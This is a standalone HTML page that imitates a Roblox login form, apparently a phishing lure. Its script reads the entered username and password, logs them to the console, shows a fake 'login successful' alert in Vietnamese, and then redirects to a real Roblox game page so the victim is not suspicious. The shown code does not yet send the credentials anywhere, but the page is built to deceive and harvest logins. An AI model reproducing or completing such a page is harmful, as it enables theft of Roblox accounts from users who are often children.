<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #0f0f0f;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #1a1a1a;
            padding: 20px;
            border-radius: 10px;
            width: 320px;
            text-align: center;
            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.1);
        }
        .login-container h2 {
            color: white;
            margin-bottom: 15px;
            font-size: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border-radius: 5px;
            border: 1px solid #333;
            background-color: #262626;
            color: white;
            outline: none;
        }
        button {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            border-radius: 5px;
            border: none;
            background-color: #007bff;
            color: white;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login to Roblox</h2>
        <input type="text" id="username" placeholder="Username/Email/Phone">
        <input type="password" id="password" placeholder="Password">
        <button onclick="redirectToRoblox()">Log In</button>
    </div>

    <script>
        function redirectToRoblox() {
            let username = document.getElementById("username").value;
            let password = document.getElementById("password").value;
            
            console.log("User:", username);
            console.log("Password:", password);
            
            alert("Đăng nhập thành công! Đang chuyển hướng...");
            
            setTimeout(() => {
                window.location.href = "https://www.roblox.com/vi/games/2753915549/Blox-Fruits/";
            }, 1000);
        }
    </script>
</body>
</html>
